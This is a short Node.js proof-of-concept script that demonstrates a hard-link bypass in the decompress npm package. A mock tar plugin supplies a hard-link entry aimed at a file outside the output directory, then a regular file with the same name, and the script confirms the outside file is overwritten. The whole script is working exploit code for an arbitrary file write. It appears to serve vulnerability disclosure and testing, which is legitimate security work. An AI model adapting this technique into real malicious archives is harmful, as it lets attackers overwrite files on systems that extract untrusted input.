#!/usr/bin/env node
// PoC: decompress Hardlink Write Bypass
// Demonstrates bypassing preventWritingThroughSymlink using a hard link entry
// to write arbitrary files outside the output directory.
// Usage: node poc_hardlink_bypass.js  (requires: npm install decompress@4.2.1)

const fs = require('fs');
const path = require('path');
const decompress = require('decompress');

const target = '/tmp/target_file.txt';
fs.writeFileSync(target, 'ORIGINAL_CONTENT');

// Clean output directory
try { fs.rmSync('/tmp/decompress_out', { recursive: true, force: true }); } catch(e) {}

console.log('[*] Target file:', target);
console.log('[*] Target file content before:', fs.readFileSync(target, 'utf8'));

// A custom plugin mimicking a tar file extraction containing:
// 1. A hard link entry named 'link.txt' pointing to '/tmp/target_file.txt'
// 2. A regular file entry named 'link.txt' containing the payload
const mockHardlinkPlugin = () => (input, opts) => {
  return Promise.resolve([
    {
      path: 'link.txt',
      type: 'link',
      linkname: target
    },
    {
      path: 'link.txt',
      type: 'file',
      data: Buffer.from('POC_HARDLINK_OVERWRITE_SUCCESS'),
      mtime: new Date()
    }
  ]);
};

decompress(Buffer.from(''), '/tmp/decompress_out', { plugins: [mockHardlinkPlugin()] })
  .then(() => {
    console.log('[+] Extraction Completed!');
    console.log('[+] Target file content after:', fs.readFileSync(target, 'utf8'));
    if (fs.readFileSync(target, 'utf8') === 'POC_HARDLINK_OVERWRITE_SUCCESS') {
      console.log('[+] SUCCESS: Bypass confirmed! File outside output directory was overwritten.');
    }
  })
  .catch(err => {
    console.error('[-] Extraction failed:', err);
  });
